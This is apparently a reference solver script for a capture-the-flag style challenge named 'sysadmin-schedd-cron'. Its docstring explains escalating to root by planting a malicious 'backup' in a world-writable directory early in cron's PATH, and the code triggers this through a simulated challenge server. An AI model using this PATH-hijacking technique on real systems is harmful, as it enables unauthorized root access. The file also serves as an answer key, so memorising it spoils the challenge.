#!/usr/bin/env python3
"""Reference solver for sysadmin-schedd-cron.

Root's cron resolves `backup` through a PATH whose first dir (/opt/tools) is
world-writable. Drop a malicious `backup` there and trigger the run.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _get(url):
    return json.loads(urllib.request.urlopen(url, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    _get(base + "/drop?name=backup&action=emit-flag")
    return _get(base + "/run-cron")["output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
